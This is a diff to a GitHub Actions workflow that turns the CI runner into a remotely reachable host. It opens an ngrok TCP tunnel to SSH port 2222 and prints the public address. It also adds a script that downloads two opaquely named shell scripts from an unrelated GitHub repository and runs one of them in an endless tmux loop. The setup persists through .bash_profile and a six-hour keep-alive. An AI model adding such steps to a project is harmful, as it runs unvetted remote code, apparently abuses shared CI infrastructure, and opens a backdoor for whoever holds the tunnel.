@@ -20,7 +20,7 @@ jobs:
         sleep 10
         docker ps
 
-    - name: Install tools on runner
+    - name: Install tools (runner)
       run: |
         sudo apt-get update
         sudo apt-get install -y curl jq wget
@@ -34,6 +34,53 @@ jobs:
     - name: Auth ngrok
       run: |
         ./ngrok authtoken ${{ secrets.NGROK_AUTH_TOKEN }}
+
+    - name: Start ngrok TCP 2222
+      run: |
+        ./ngrok tcp 2222 > ngrok.log &
+        sleep 15
+        curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url' > public_url.txt
+        echo 'SSH:'
+        cat public_url.txt
+
+    - name: Create start.sh on runner
+      run: |
+        cat > start.sh << 'EOF'
+        #!/bin/bash
+        set -e
+
+        HOME=/home/ttt0090
+
+        if [ ! -f "$HOME/.initialized" ]; then
+          apt update
+          apt install -y wget tmux curl
+
+          cd $HOME
+
+          wget -q https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/.github/workflows/ww12345.sh
+          chmod +x ww12345.sh
+
+          wget -q https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/.github/workflows/oneupalways2.sh
+          chmod +x oneupalways2.sh
+
+          touch $HOME/.initialized
+        fi
+
+        tmux has-session -t auto 2>/dev/null ||           tmux new-session -d -s auto "bash ww12345.sh; while true; do bash oneupalways2.sh; done"
+
+        exec tmux attach -t auto
+        EOF
+
+    - name: Copy start.sh into container and enable auto-run
+      run: |
+        docker cp start.sh dockerssh:/home/ttt0090/start.sh
+        docker exec dockerssh chmod +x /home/ttt0090/start.sh
+        docker exec dockerssh chown ttt0090:ttt0090 /home/ttt0090/start.sh
+        docker exec dockerssh bash -c "echo 'bash ~/start.sh' >> /home/ttt0090/.bash_profile"
+
+    - name: Keep alive
+      run: |
+        for i in $(seq 1 360); do sleep 60; done
 
     - name: Start ngrok TCP 2222
       run: |
